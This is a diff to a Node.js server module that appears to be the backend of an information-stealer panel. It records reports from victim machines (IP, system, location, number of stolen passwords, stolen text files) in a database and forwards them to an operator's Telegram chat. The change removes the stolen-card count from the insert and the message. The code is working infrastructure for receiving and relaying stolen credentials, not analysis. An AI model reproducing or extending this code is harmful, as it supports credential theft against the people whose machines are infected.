@@ -109,12 +109,11 @@ module.exports = function (db) {
 			if (!(await db.promiseSelect("SELECT * FROM data_owners WHERE ip = ? AND time > strftime('%s', 'now') - 60*60*12", [req.body.comp.ip])).length) {
 				replay_ips_data[req.clientIp] = Math.floor(new Date().getTime() / 1000) + 60 * 60 * 1;
 
-				db.run("INSERT INTO data_owners (owner_id, system, ip, count_passwords, count_cards, country, city, txt, checked, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, strftime('%s', 'now'))", [
+				db.run("INSERT INTO data_owners (owner_id, system, ip, count_passwords, country, city, txt, checked, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, strftime('%s', 'now'))", [
 					owner_id,
 					req.body.comp.system,
 					req.body.comp.ip,
 					req.body.pass.length,
-					req.body.cards,
 					req.body.comp.location.country,
 					req.body.comp.location.city,
 					req.body.txt,
@@ -175,7 +174,7 @@ module.exports = function (db) {
 								chat_id: owner[0].telegram_id,
 								text: [
 									req.body.comp.location.country + " | " + req.body.comp.ip,
-									"🔑 " + req.body.pass.length + " | 💳 " + req.body.cards + " | 📂 " + req.body.txt,
+									"🔑 " + req.body.pass.length + " | 📂 " + req.body.txt,
 									req.body.comp.location.city + " | " + req.body.comp.system,
 									emoji.join(" | ")
 								].join("\n")
